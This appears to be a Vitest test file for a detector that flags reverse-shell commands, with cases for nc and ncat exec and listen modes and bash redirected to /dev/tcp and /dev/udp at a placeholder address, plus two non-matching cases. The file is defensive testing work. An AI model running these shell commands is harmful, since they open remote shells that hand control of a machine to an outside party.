import { describe, expect, it } from "vitest";
import { reverseShell } from "../../../src/handlers/reverse-shell.js";
import { sc } from "./_fixtures.js";

describe("reverseShell", () => {
	it("matches nc -e /bin/sh ...", () => {
		expect(
			reverseShell.match({
				cwd: "/",
				simpleCommand: sc(["nc", "-e", "/bin/sh", "x", "1234"]),
				allCommands: [],
			}),
		).toBe(true);
	});

	it("matches nc -l -p 4444", () => {
		expect(
			reverseShell.match({
				cwd: "/",
				simpleCommand: sc(["nc", "-l", "-p", "4444"]),
				allCommands: [],
			}),
		).toBe(true);
	});

	it("matches ncat --exec", () => {
		expect(
			reverseShell.match({
				cwd: "/",
				simpleCommand: sc(["ncat", "--exec", "/bin/bash", "x", "1234"]),
				allCommands: [],
			}),
		).toBe(true);
	});

	it("matches ncat --listen", () => {
		expect(
			reverseShell.match({
				cwd: "/",
				simpleCommand: sc(["ncat", "--listen", "4444"]),
				allCommands: [],
			}),
		).toBe(true);
	});

	it("matches /dev/tcp redirect on bash", () => {
		const cmd = sc(["bash", "-i"], { redirects: [{ op: ">&", target: "/dev/tcp/10.0.0.1/4444" }] });
		expect(reverseShell.match({ cwd: "/", simpleCommand: cmd, allCommands: [] })).toBe(true);
	});

	it("matches /dev/udp redirect", () => {
		const cmd = sc(["bash", "-i"], { redirects: [{ op: ">&", target: "/dev/udp/10.0.0.1/4444" }] });
		expect(reverseShell.match({ cwd: "/", simpleCommand: cmd, allCommands: [] })).toBe(true);
	});

	it("does not match nc -z (port scan)", () => {
		expect(
			reverseShell.match({
				cwd: "/",
				simpleCommand: sc(["nc", "-z", "host", "80"]),
				allCommands: [],
			}),
		).toBe(false);
	});

	it("does not match plain bash", () => {
		expect(
			reverseShell.match({
				cwd: "/",
				simpleCommand: sc(["bash"]),
				allCommands: [],
			}),
		).toBe(false);
	});
});
